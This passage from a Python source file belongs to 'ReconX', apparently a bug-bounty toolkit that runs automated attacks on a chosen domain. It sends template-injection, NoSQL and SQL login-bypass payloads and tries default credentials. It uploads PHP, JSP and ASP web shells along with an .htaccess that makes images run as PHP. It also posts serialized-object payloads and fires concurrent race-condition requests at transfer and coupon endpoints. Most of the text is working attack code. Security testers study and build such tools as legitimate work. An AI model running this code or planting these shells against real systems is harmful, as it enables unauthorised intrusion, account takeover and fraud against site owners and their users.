        ssti_output = f"{self.scan_dir}/vulnerabilities/ssti_{self.domain}.txt"
        
        # SSTI payloads for different template engines
        ssti_payloads = {
            'Jinja2': ['{{7*7}}', '{{config}}', '{{request}}'],
            'Twig': ['{{7*7}}', '{{_self}}', '{{dump(app)}}'],
            'Smarty': ['{7*7}', '{$smarty.version}', '{php}echo 7*7{/php}'],
            'Freemarker': ['${7*7}', '${product.getClass()}', '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}'],
            'Velocity': ['${"7"*7}', '#set($x=7*7)$x', '$class.inspect("java.lang.Runtime")']
        }
        
        try:
            import requests
            from urllib.parse import quote
            
            with open(ssti_output, 'w') as f:
                f.write("SSTI Vulnerability Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Test common parameters
                test_params = ['q', 'search', 'name', 'template', 'page', 'view']
                
                for param in test_params:
                    f.write(f"Testing parameter: {param}\n")
                    
                    for engine, payloads in ssti_payloads.items():
                        f.write(f"\nTesting {engine} payloads:\n")
                        
                        for payload in payloads:
                            try:
                                encoded_payload = quote(payload)
                                url = f"https://{self.domain}/?{param}={encoded_payload}"
                                
                                response = requests.get(url, timeout=10, verify=False)
                                
                                # Check for template execution
                                if payload == '{{7*7}}' and '49' in response.text:
                                    f.write(f"POTENTIAL SSTI ({engine}): {payload} -> 49 found in response\n")
                                elif payload == '{7*7}' and '49' in response.text:
                                    f.write(f"POTENTIAL SSTI ({engine}): {payload} -> 49 found in response\n")
                                elif payload == '${7*7}' and '49' in response.text:
                                    f.write(f"POTENTIAL SSTI ({engine}): {payload} -> 49 found in response\n")
                                elif 'config' in payload and 'SECRET_KEY' in response.text:
                                    f.write(f"POTENTIAL SSTI ({engine}): Config exposure detected\n")
                                
                            except Exception as e:
                                f.write(f"Error with payload {payload}: {e}\n")
                    
                    f.write("\n" + "-"*50 + "\n")
                
                f.write("\nManual testing recommendations:\n")
                f.write("- Test POST parameters and form fields\n")
                f.write("- Check file upload functionality\n")
                f.write("- Test contact forms and email templates\n")
                
        except Exception as e:
            self.print_error(f"SSTI testing failed: {e}")
        
        self.print_success("SSTI testing completed")

    def nosql_injection_testing(self):
        """Test for NoSQL injection vulnerabilities"""
        self.print_info("Starting NoSQL injection testing...")
        
        nosql_output = f"{self.scan_dir}/vulnerabilities/nosql_{self.domain}.txt"
        
        # NoSQL injection payloads
        nosql_payloads = {
            'MongoDB': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$regex": ".*"}',
                '{"$where": "this.password.match(/.*/)"}',
                '{"username": {"$ne": null}, "password": {"$ne": null}}'
            ],
            'CouchDB': [
                '{"selector": {"_id": {"$gt": null}}}',
                '{"selector": {"password": {"$ne": "invalid"}}}',
                '{"selector": {"$and": [{"username": {"$ne": null}}]}}'
            ]
        }
        
        try:
            import requests
            import json
            
            with open(nosql_output, 'w') as f:
                f.write("NoSQL Injection Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Test common API endpoints
                endpoints = ['/api/users', '/api/login', '/api/search', '/login', '/search']
                
                for endpoint in endpoints:
                    f.write(f"Testing endpoint: {endpoint}\n")
                    
                    for db_type, payloads in nosql_payloads.items():
                        f.write(f"\nTesting {db_type} payloads:\n")
                        
                        for payload in payloads:
                            try:
                                headers = {'Content-Type': 'application/json'}
                                response = requests.post(f"https://{self.domain}{endpoint}", 
                                                       data=payload, headers=headers, timeout=10, verify=False)
                                
                                # Check for potential injection
                                if response.status_code == 200 and len(response.text) > 100:
                                    f.write(f"Interesting response for payload: {payload}\n")
                                    f.write(f"Status: {response.status_code}, Length: {len(response.text)}\n")
                                
                                # Also test as URL parameter
                                param_response = requests.get(f"https://{self.domain}{endpoint}?q={payload}", 
                                                            timeout=10, verify=False)
                                if param_response.status_code == 200:
                                    f.write(f"URL param test response: {param_response.status_code}\n")
                                
                            except Exception as e:
                                f.write(f"Error with payload {payload}: {e}\n")
                    
                    f.write("\n" + "-"*50 + "\n")
                
                f.write("\nManual testing recommendations:\n")
                f.write("- Test authentication bypass with NoSQL operators\n")
                f.write("- Check for data extraction via blind NoSQL injection\n")
                f.write("- Test aggregation pipeline injections\n")
                
        except Exception as e:
            self.print_error(f"NoSQL injection testing failed: {e}")
        
        self.print_success("NoSQL injection testing completed")

    def file_upload_vulnerabilities(self):
        """Test for file upload vulnerabilities"""
        self.print_info("Starting file upload vulnerability testing...")
        
        upload_output = f"{self.scan_dir}/vulnerabilities/file_upload_{self.domain}.txt"
        
        try:
            import requests
            import tempfile
            import os
            
            # Create test files
            test_files = {
                'php_shell.php': '<?php system($_GET["cmd"]); ?>',
                'jsp_shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
                'asp_shell.asp': '<%eval request("cmd")%>',
                'test.txt': 'test file content',
                'test.jpg': b'\xff\xd8\xff\xe0JFIF',  # JPEG header
                'malicious.php.jpg': '<?php system($_GET["cmd"]); ?>',
                '.htaccess': 'AddType application/x-httpd-php .jpg'
            }
            
            with open(upload_output, 'w') as f:
                f.write("File Upload Vulnerability Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Common upload endpoints
                upload_endpoints = ['/upload', '/api/upload', '/files/upload', '/admin/upload']
                
                for endpoint in upload_endpoints:
                    f.write(f"Testing endpoint: {endpoint}\n")
                    
                    for filename, content in test_files.items():
                        try:
                            # Create temporary file
                            with tempfile.NamedTemporaryFile(mode='wb', delete=False) as tmp_file:
                                if isinstance(content, str):
                                    tmp_file.write(content.encode())
                                else:
                                    tmp_file.write(content)
                                tmp_path = tmp_file.name
                            
                            # Test upload
                            with open(tmp_path, 'rb') as test_file:
                                files = {'file': (filename, test_file)}
                                response = requests.post(f"https://{self.domain}{endpoint}", 
                                                       files=files, timeout=10, verify=False)
                                
                                f.write(f"File: {filename} -> Status: {response.status_code}\n")
                                
                                if response.status_code in [200, 201, 302]:
                                    f.write(f"POTENTIAL UPLOAD SUCCESS: {filename}\n")
                                    if 'upload' in response.text.lower():
                                        f.write("Upload confirmation found in response\n")
                            
                            # Cleanup
                            os.unlink(tmp_path)
                            
                        except Exception as e:
                            f.write(f"Error testing {filename}: {e}\n")
                    
                    f.write("\n" + "-"*50 + "\n")
                
                f.write("\nManual testing recommendations:\n")
                f.write("- Test double extensions (file.php.jpg)\n")
                f.write("- Try null byte injections (file.php%00.jpg)\n")
                f.write("- Check for path traversal in filename\n")
                f.write("- Test MIME type validation bypass\n")
                f.write("- Verify uploaded file execution\n")
                
        except Exception as e:
            self.print_error(f"File upload testing failed: {e}")
        
        self.print_success("File upload vulnerability testing completed")

    def authentication_bypass(self):
        """Test for authentication bypass vulnerabilities"""
        self.print_info("Starting authentication bypass testing...")
        
        auth_output = f"{self.scan_dir}/vulnerabilities/auth_bypass_{self.domain}.txt"
        
        # Authentication bypass payloads
        bypass_payloads = {
            'SQL_Injection': ["' OR '1'='1", "admin'--", "' OR 1=1#"],
            'NoSQL_Injection': ['{"$ne": null}', '{"$gt": ""}'],
            'Default_Creds': [('admin', 'admin'), ('admin', 'password'), ('root', 'root')],
            'Parameter_Pollution': ['username=admin&username=guest', 'user[]=admin&user[]=guest'],
            'HTTP_Verb_Tampering': ['PUT', 'PATCH', 'DELETE', 'HEAD']
        }
        
        try:
            import requests
            
            with open(auth_output, 'w') as f:
                f.write("Authentication Bypass Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Common login endpoints
                login_endpoints = ['/login', '/admin', '/api/login', '/auth', '/signin']
                
                for endpoint in login_endpoints:
                    f.write(f"Testing endpoint: {endpoint}\n")
                    
                    # Test SQL injection bypasses
                    for payload in bypass_payloads['SQL_Injection']:
                        try:
                            data = {'username': payload, 'password': 'test'}
                            response = requests.post(f"https://{self.domain}{endpoint}", 
                                                   data=data, timeout=10, verify=False, allow_redirects=False)
                            
                            if response.status_code in [302, 200] and ('dashboard' in response.text.lower() or 
                                                                      'welcome' in response.text.lower() or
                                                                      'redirect' in response.headers.get('location', '').lower()):
                                f.write(f"POTENTIAL SQL INJECTION BYPASS: {payload}\n")
                                
                        except Exception as e:
                            f.write(f"Error with SQL payload {payload}: {e}\n")
                    
                    # Test default credentials
                    for username, password in bypass_payloads['Default_Creds']:
                        try:
                            data = {'username': username, 'password': password}
                            response = requests.post(f"https://{self.domain}{endpoint}", 
                                                   data=data, timeout=10, verify=False, allow_redirects=False)
                            
                            if response.status_code in [302, 200] and 'invalid' not in response.text.lower():
                                f.write(f"POTENTIAL DEFAULT CREDS: {username}:{password}\n")
                                
                        except Exception as e:
                            f.write(f"Error with creds {username}:{password}: {e}\n")
                    
                    f.write("\n" + "-"*50 + "\n")
                
                f.write("\nManual testing recommendations:\n")
                f.write("- Test session fixation attacks\n")
                f.write("- Check for JWT algorithm confusion\n")
                f.write("- Test OAuth implementation flaws\n")
                f.write("- Verify password reset functionality\n")
                
        except Exception as e:
            self.print_error(f"Authentication bypass testing failed: {e}")
        
        self.print_success("Authentication bypass testing completed")

    def cloud_storage_enumeration(self):
        """Enumerate cloud storage buckets (AWS S3, GCS, Azure)"""
        self.print_info("Starting cloud storage enumeration...")
        
        cloud_output = f"{self.scan_dir}/cloud/storage_{self.domain}.txt"
        Path(f"{self.scan_dir}/cloud").mkdir(parents=True, exist_ok=True)
        
        # Cloud storage patterns
        storage_patterns = {
            'AWS_S3': [
                f'{self.domain}.s3.amazonaws.com',
                f'{self.domain.replace(".", "-")}.s3.amazonaws.com',
                f'{self.domain.replace(".", "")}.s3.amazonaws.com',
                f'{self.domain}-backup.s3.amazonaws.com',
                f'{self.domain}-data.s3.amazonaws.com'
            ],
            'Google_Cloud': [
                f'storage.googleapis.com/{self.domain}',
                f'storage.googleapis.com/{self.domain.replace(".", "-")}',
                f'{self.domain}.storage.googleapis.com'
            ],
            'Azure_Blob': [
                f'{self.domain}.blob.core.windows.net',
                f'{self.domain.replace(".", "")}.blob.core.windows.net',
                f'{self.domain.replace(".", "-")}.blob.core.windows.net'
            ]
        }
        
        try:
            import requests
            
            with open(cloud_output, 'w') as f:
                f.write("Cloud Storage Enumeration\n")
                f.write("=" * 40 + "\n\n")
                
                for platform, urls in storage_patterns.items():
                    f.write(f"{platform} Testing:\n")
                    
                    for url in urls:
                        try:
                            response = requests.get(f"https://{url}", timeout=10, verify=False)
                            
                            f.write(f"URL: {url} -> Status: {response.status_code}\n")
                            
                            if response.status_code == 200:
                                f.write(f"ACCESSIBLE BUCKET FOUND: {url}\n")
                                if 'xml' in response.headers.get('content-type', '').lower():
                                    f.write("XML content detected - likely S3 bucket listing\n")
                            elif response.status_code == 403:
                                f.write(f"BUCKET EXISTS (Access Denied): {url}\n")
                                
                        except Exception as e:
                            f.write(f"Error checking {url}: {e}\n")
                    
                    f.write("\n")
                
                f.write("Manual verification recommendations:\n")
                f.write("- Use aws s3 ls for S3 bucket enumeration\n")
                f.write("- Check for misconfigured bucket policies\n")
                f.write("- Test file upload to accessible buckets\n")
                
        except Exception as e:
            self.print_error(f"Cloud storage enumeration failed: {e}")
        
        self.print_success("Cloud storage enumeration completed")

    def websocket_testing(self):
        """Test WebSocket security"""
        self.print_info("Starting WebSocket security testing...")
        
        ws_output = f"{self.scan_dir}/vulnerabilities/websocket_{self.domain}.txt"
        
        try:
            import requests
            
            with open(ws_output, 'w') as f:
                f.write("WebSocket Security Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Check for WebSocket endpoints
                common_ws_endpoints = ['/ws', '/websocket', '/socket.io', '/api/ws', '/chat']
                
                for endpoint in common_ws_endpoints:
                    try:
                        # Test WebSocket upgrade
                        headers = {
                            'Connection': 'Upgrade',
                            'Upgrade': 'websocket',
                            'Sec-WebSocket-Version': '13',
                            'Sec-WebSocket-Key': 'x3JJHMbDL1EzLkh9GBhXDw=='
                        }
                        
                        response = requests.get(f"https://{self.domain}{endpoint}", 
                                              headers=headers, timeout=10, verify=False)
                        
                        f.write(f"Endpoint: {endpoint} -> Status: {response.status_code}\n")
                        
                        if response.status_code == 101:
                            f.write(f"WEBSOCKET ENDPOINT FOUND: {endpoint}\n")
                            f.write("Manual testing required:\n")
                            f.write("- Test authentication bypass\n")
                            f.write("- Check for XSS in WebSocket messages\n")
                            f.write("- Test rate limiting\n\n")
                        elif 'websocket' in response.text.lower():
                            f.write(f"WebSocket references found in {endpoint}\n")
                            
                    except Exception as e:
                        f.write(f"Error testing {endpoint}: {e}\n")
                
                f.write("\nWebSocket security recommendations:\n")
                f.write("- Implement proper authentication\n")
                f.write("- Validate and sanitize all messages\n")
                f.write("- Use rate limiting and connection limits\n")
                f.write("- Check origin headers properly\n")
                
        except Exception as e:
            self.print_error(f"WebSocket testing failed: {e}")
        
        self.print_success("WebSocket security testing completed")

    def deserialization_testing(self):
        """Test for deserialization vulnerabilities"""
        self.print_info("Starting deserialization vulnerability testing...")
        
        deser_output = f"{self.scan_dir}/vulnerabilities/deserialization_{self.domain}.txt"
        
        # Common deserialization patterns and payloads
        deser_patterns = {
            'Java': [
                'rO0AB',  # Java serialized object header (base64)
                'aced00',  # Java serialized object header (hex)
                'serialver'
            ],
            'Python': [
                'pickle',
                'cPickle',
                '__reduce__'
            ],
            'PHP': [
                'O:',  # PHP object serialization
                'a:',  # PHP array serialization
                'serialize'
            ],
            '.NET': [
                'AAEAAAD',  # .NET BinaryFormatter header
                'System.Runtime.Serialization'
            ]
        }
        
        try:
            import requests
            import base64
            
            with open(deser_output, 'w') as f:
                f.write("Deserialization Vulnerability Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Test common endpoints that might handle serialized data
                endpoints = ['/api', '/upload', '/import', '/data']
                
                for endpoint in endpoints:
                    f.write(f"Testing endpoint: {endpoint}\n")
                    
                    # Check for deserialization indicators in responses
                    try:
                        response = requests.get(f"https://{self.domain}{endpoint}", timeout=10, verify=False)
                        
                        for lang, patterns in deser_patterns.items():
                            for pattern in patterns:
                                if pattern in response.text:
                                    f.write(f"POTENTIAL {lang} DESERIALIZATION: Found '{pattern}'\n")
                    
                        # Test with common serialized payloads
                        test_payloads = [
                            'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAAA',  # Java empty ArrayList
                            'O:8:"stdClass":0:{}',  # PHP empty object
                            'ctest\nTest\nq\x01.'  # Python pickle
                        ]
                        
                        for payload in test_payloads:
                            try:
                                headers = {'Content-Type': 'application/octet-stream'}
                                response = requests.post(f"https://{self.domain}{endpoint}", 
                                                       data=payload, headers=headers, timeout=10, verify=False)
                                
                                if response.status_code not in [404, 405]:
                                    f.write(f"Interesting response to serialized payload: {response.status_code}\n")
                                    
                            except Exception as e:
                                f.write(f"Error with payload: {e}\n")
                    
                    except Exception as e:
                        f.write(f"Error testing endpoint {endpoint}: {e}\n")
                    
                    f.write("\n")
                
                f.write("Manual testing recommendations:\n")
                f.write("- Identify serialization libraries in use\n")
                f.write("- Test with ysoserial for Java deserialization\n")
                f.write("- Check for pickle deserialization in Python apps\n")
                f.write("- Test .NET BinaryFormatter vulnerabilities\n")
                
        except Exception as e:
            self.print_error(f"Deserialization testing failed: {e}")
        
        self.print_success("Deserialization testing completed")

    def race_condition_testing(self):
        """Test for race condition vulnerabilities"""
        self.print_info("Starting race condition testing...")
        
        race_output = f"{self.scan_dir}/vulnerabilities/race_condition_{self.domain}.txt"
        
        try:
            import requests
            import threading
            import time
            
            def make_request(url, data, results, index):
                try:
                    response = requests.post(url, data=data, timeout=10, verify=False)
                    results[index] = {
                        'status': response.status_code,
                        'length': len(response.text),
                        'time': time.time()
                    }
                except Exception as e:
                    results[index] = {'error': str(e), 'time': time.time()}
            
            with open(race_output, 'w') as f:
                f.write("Race Condition Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Test common race condition scenarios
                race_scenarios = [
                    {
                        'endpoint': '/api/transfer',
                        'data': {'amount': '100', 'to': 'attacker'},
                        'description': 'Financial transaction race condition'
                    },
                    {
                        'endpoint': '/coupon/redeem',
                        'data': {'code': 'DISCOUNT50'},
                        'description': 'Coupon redemption race condition'
                    },
                    {
                        'endpoint': '/register',
                        'data': {'username': 'testuser', 'email': 'test@test.com'},
                        'description': 'Registration race condition'
                    }
                ]
                
                for scenario in race_scenarios:
                    f.write(f"Testing: {scenario['description']}\n")
                    f.write(f"Endpoint: {scenario['endpoint']}\n")
                    
                    url = f"https://{self.domain}{scenario['endpoint']}"
                    
                    # Launch multiple concurrent requests
                    threads = []
                    results = {}
                    num_requests = 10
                    
                    start_time = time.time()
                    
                    for i in range(num_requests):
                        thread = threading.Thread(target=make_request, 
                                                args=(url, scenario['data'], results, i))
                        threads.append(thread)
                        thread.start()
                    
                    # Wait for all threads to complete
                    for thread in threads:
                        thread.join()
                    
                    # Analyze results
                    successful_responses = 0
                    status_codes = {}
                    
                    for i, result in results.items():
                        if 'status' in result:
                            status = result['status']
                            status_codes[status] = status_codes.get(status, 0) + 1
                            if status == 200:
                                successful_responses += 1
                    
                    f.write(f"Concurrent requests sent: {num_requests}\n")
                    f.write(f"Successful responses (200): {successful_responses}\n")
                    f.write(f"Status code distribution: {status_codes}\n")
                    
                    if successful_responses > 1:
                        f.write("POTENTIAL RACE CONDITION: Multiple successful responses\n")
                    
                    f.write("\n" + "-"*50 + "\n")
                
                f.write("\nManual testing recommendations:\n")
                f.write("- Test payment and financial operations\n")
                f.write("- Check file upload race conditions\n")
                f.write("- Test privilege escalation scenarios\n")
                f.write("- Verify atomic operations in critical functions\n")
                
        except Exception as e:
            self.print_error(f"Race condition testing failed: {e}")
        
        self.print_success("Race condition testing completed")

    def business_logic_testing(self):
        """Test for business logic vulnerabilities"""
        self.print_info("Starting business logic vulnerability testing...")
        
        logic_output = f"{self.scan_dir}/vulnerabilities/business_logic_{self.domain}.txt"
        
        try:
            import requests
            
            with open(logic_output, 'w') as f:
                f.write("Business Logic Vulnerability Testing\n")
                f.write("=" * 40 + "\n\n")
                
                # Business logic test scenarios
                test_scenarios = [
                    {
                        'name': 'Negative Price Testing',
                        'endpoint': '/purchase',
                        'data': {'item': 'product1', 'quantity': '1', 'price': '-100'},
                        'description': 'Test negative prices in purchase flow'
                    },
                    {
                        'name': 'Excessive Quantity Testing',
                        'endpoint': '/cart/add',
                        'data': {'item': 'product1', 'quantity': '999999999'},
                        'description': 'Test integer overflow in quantity'
                    },
                    {
                        'name': 'Price Manipulation',
                        'endpoint': '/checkout',
                        'data': {'total': '0.01', 'items': 'expensive_item'},
                        'description': 'Test price manipulation during checkout'
                    },
                    {
                        'name': 'Workflow Bypass',
                        'endpoint': '/admin/approve',
                        'data': {'request_id': '12345'},
                        'description': 'Test workflow step bypassing'
                    }
                ]
                
                for scenario in test_scenarios:
                    f.write(f"Test: {scenario['name']}\n")
                    f.write(f"Description: {scenario['description']}\n")
                    f.write(f"Endpoint: {scenario['endpoint']}\n")
                    
                    try:
                        url = f"https://{self.domain}{scenario['endpoint']}"
                        
                        # Test GET request first
                        get_response = requests.get(url, timeout=10, verify=False)
                        f.write(f"GET Status: {get_response.status_code}\n")
                        
                        # Test POST with scenario data
                        post_response = requests.post(url, data=scenario['data'], timeout=10, verify=False)
                        f.write(f"POST Status: {post_response.status_code}\n")
                        
                        # Check for interesting responses
                        if post_response.status_code == 200 and 'error' not in post_response.text.lower():
                            f.write("POTENTIAL BUSINESS LOGIC ISSUE: Request accepted without validation\n")
                        
                        if 'success' in post_response.text.lower():
                            f.write("POTENTIAL BUSINESS LOGIC BYPASS: Success message detected\n")
                    
                    except Exception as e:
                        f.write(f"Error testing scenario: {e}\n")
                    
                    f.write("\n" + "-"*40 + "\n")
                
                # Additional business logic tests
                f.write("Additional Business Logic Test Areas:\n")
                f.write("=" * 40 + "\n")
                
                additional_tests = [
                    "Password reset token reuse",
                    "Multi-step process bypassing",
                    "Privilege escalation through parameter manipulation",
                    "Time-based restrictions bypass",
                    "Geographic restrictions bypass",
                    "Referral/invitation system abuse",
                    "Discount code stacking",
                    "Account lockout bypass"
                ]
                
                for test in additional_tests:
                    f.write(f"- {test}\n")
                
                f.write("\nManual testing recommendations:\n")
                f.write("- Map all business workflows\n")
                f.write("- Test boundary conditions\n")
                f.write("- Verify access controls at each step\n")
                f.write("- Check for missing authorization checks\n")
                
        except Exception as e:
            self.print_error(f"Business logic testing failed: {e}")
        
        self.print_success("Business logic testing completed")

    def nuclei_template_execution(self):
        """Execute Nuclei vulnerability templates"""
        self.print_info("Starting Nuclei template execution...")
        
        nuclei_output = f"{self.scan_dir}/vulnerabilities/nuclei_{self.domain}.txt"
        
        if self.check_tool_installed('nuclei'):
            # Update nuclei templates
            self.run_command("nuclei -update-templates")
            
            # Run nuclei with various severity levels
            nuclei_commands = [
                f"nuclei -u https://{self.domain} -s critical,high -o {nuclei_output}",
                f"nuclei -u https://{self.domain} -tags cve -o {nuclei_output.replace('.txt', '_cve.txt')}",
                f"nuclei -u https://{self.domain} -tags exposure -o {nuclei_output.replace('.txt', '_exposure.txt')}",
                f"nuclei -u https://{self.domain} -tags misconfig -o {nuclei_output.replace('.txt', '_misconfig.txt')}"
            ]
            
            for cmd in nuclei_commands:
                self.run_command(cmd)
        else:
            # Install nuclei if not present
            self.print_warning("Nuclei not installed, attempting to install...")
            if self.run_command("go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"):
                self.nuclei_template_execution()  # Retry after installation
        
        self.print_success("Nuclei template execution completed")
    
    def run(self):
        """Main execution method"""
        self.print_banner()
        
        while True:
            choices = self.show_menu()
            if choices == '0':
                break
            self.run_selected_scans(choices)
            
            continue_scan = input(f"\n{Colors.YELLOW}Do you want to run another scan? (y/n): {Colors.END}")
            if continue_scan.lower() != 'y':
                break
        
        self.print_success("ReconX scan completed!")
        self.print_info(f"All results saved in: {self.scan_dir}")

def main():
    parser = argparse.ArgumentParser(description="ReconX - Advanced Bug Hunting Reconnaissance Toolkit")
    parser.add_argument('-t', '--target', required=True, help='Target domain (e.g., example.com)')
    parser.add_argument('-a', '--auto', action='store_true', help='Run full automatic scan')
    
    args = parser.parse_args()
    
    # Create ReconX instance with automated flag
    reconx = ReconX(args.target, automated=args.auto)
    
    if args.auto:
        reconx.print_banner()
        reconx.full_scan()
    else:
        reconx.run()

if __name__ == "__main__":
    main()
